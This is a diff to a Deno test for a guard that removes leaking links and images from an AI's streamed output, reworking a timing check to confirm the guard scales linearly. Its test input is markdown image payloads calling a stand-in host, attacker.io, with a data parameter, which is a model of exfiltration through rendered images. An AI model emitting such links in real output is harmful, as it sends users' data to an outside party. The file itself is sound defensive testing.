@@ -136,11 +136,27 @@ Deno.test('a thought is released as it clears, the leak omitted, and the guard s
 });
 
 Deno.test('a thought writing leak after leak loses the rest, in time in proportion to its length', () => {
-  const guard = createThoughtGuard({ omit: OMIT_ALL, given: givenUrlSets() });
-  const start = performance.now();
-  const pieces = Array.from({ length: 2000 }, (_, k) => `![x](https://attacker.io/p?d=${k}) `);
-  const { shown } = think(guard, pieces);
-  assertEquals(performance.now() - start < 3000, true);
+  const leaks = (length: number) =>
+    Array.from({ length }, (_, k) => `![x](https://attacker.io/p?d=${k}) `);
+  // The fastest of three: other work on the machine only ever adds time.
+  const time = (length: number) => {
+    let fastest = Number.POSITIVE_INFINITY;
+    for (let run = 0; run < 3; run++) {
+      const started = performance.now();
+      think(createThoughtGuard({ omit: OMIT_ALL, given: givenUrlSets() }), leaks(length));
+      fastest = Math.min(fastest, performance.now() - started);
+    }
+    return fastest;
+  };
+  time(100);
+  // Under five milliseconds the clock measures the machine, not the guard.
+  const ratio = time(2000) / Math.max(time(500), 5);
+  // A rescan of the whole thought at each leak is sixteen times.
+  assertEquals(ratio < 8 ? 'linear' : `2000/500 took ${ratio.toFixed(1)}x`, 'linear');
+  const { shown } = think(
+    createThoughtGuard({ omit: OMIT_ALL, given: givenUrlSets() }),
+    leaks(2000),
+  );
   assertEquals(/attacker\.io/.test(shown), false);
   assertEquals(
     shown.endsWith(OMIT_IMAGE.trimStart()) || shown.endsWith(OMIT_LINK.trimStart()),
